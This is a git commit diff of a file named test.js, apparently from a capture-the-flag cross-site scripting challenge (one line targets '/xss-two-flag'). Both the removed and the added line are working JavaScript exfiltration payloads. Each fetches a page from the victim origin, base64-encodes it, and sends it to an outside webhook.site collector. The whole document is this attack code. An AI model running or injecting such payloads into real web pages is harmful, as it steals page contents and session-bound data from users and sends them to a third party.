201e25563265315b981eb7d57f22fc0d453eeae6
ineedabetterh4ndl3 <139599187+uhavebeenpwned@users.noreply.github.com>
2026-03-20 23:28:28 +0000

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-fetch('/xss-two-flag').then(r=>r.text()).then(d=>fetch('https://webhook.site/8afdc564-a85d-4f26-a53a-baba2da53b83?d='+btoa(d)))
+fetch('/').then(r=>r.text()).then(d=>fetch('https://webhook.site/8afdc564-a85d-4f26-a53a-baba2da53b83?d='+btoa(d)))
